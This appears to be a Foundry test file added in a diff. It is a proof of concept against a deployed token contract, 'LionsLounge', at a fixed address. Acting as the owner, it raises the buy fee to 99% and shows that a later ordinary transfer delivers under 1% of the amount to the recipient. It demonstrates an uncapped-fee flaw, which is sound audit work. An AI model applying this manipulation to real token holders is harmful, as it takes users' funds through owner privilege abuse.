@@ -1,0 +1,64 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.7;
+
+import "forge-std/Test.sol";
+
+interface ILionsLounge {
+    function getOwner() external view returns (address);
+    function setBuyFees(uint256 _liquidityFeeBuy, uint256 _buybackFeeBuy, uint256 _reflectionFeeBuy, uint256 _marketingFeeBuy, uint256 _devFeeBuy, uint256 _feeDenominator) external;
+    function getTotalFee(bool selling) external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function setBuyTxLimitInPercent(uint256 maxBuyTxPercent) external;
+}
+
+contract ExploitTest is Test {
+    ILionsLounge constant target = ILionsLounge(0x401e15Af5eDB56BE940D5a16b948F9436D2944F0);
+    address constant user1 = address(0x1234);
+    address constant user2 = address(0x5678);
+
+    function setUp() public {
+        vm.label(address(target), "LionsLounge");
+        address owner = target.getOwner();
+        vm.label(owner, "Owner");
+        vm.label(user1, "User1");
+        vm.label(user2, "User2");
+    }
+
+    function testExceedLimitFeesManipulation() public {
+        address owner = target.getOwner();
+
+        // Ensure transaction limits do not block our test
+        vm.prank(owner);
+        target.setBuyTxLimitInPercent(10000); // allow up to 100% of supply
+
+        // Give user1 some tokens from the owner (owner is fee-exempt)
+        uint256 amountToUser1 = 1000e18;
+        vm.prank(owner);
+        target.transfer(user1, amountToUser1);
+        assertEq(target.balanceOf(user1), amountToUser1);
+
+        // Record user2 balance before the fee-exposed transfer
+        uint256 user2Initial = target.balanceOf(user2);
+
+        // Owner sets buy fees to 99% (9900 out of 10000)
+        vm.prank(owner);
+        target.setBuyFees(9900, 0, 0, 0, 0, 10000);
+
+        // user1 executes a normal transfer (treated as a "buy" in the fee logic)
+        uint256 transferAmount = 500e18;
+        vm.prank(user1);
+        target.transfer(user2, transferAmount);
+
+        // After the transfer, the active fee (totalFee) is updated to totalFeeBuy
+        uint256 activeFee = target.getTotalFee(false);
+        assertTrue(activeFee > 2500, "Fee should exceed 25% (2500/10000)");
+
+        // Calculate how much user2 actually received
+        uint256 user2Received = target.balanceOf(user2) - user2Initial;
+        // With a 99% fee, user2 should receive only ~1% of the transferred amount
+        assertTrue(user2Received < transferAmount * 100 / 10000, "User2 should receive less than 1% due to 99% fee");
+    }
+}
+```
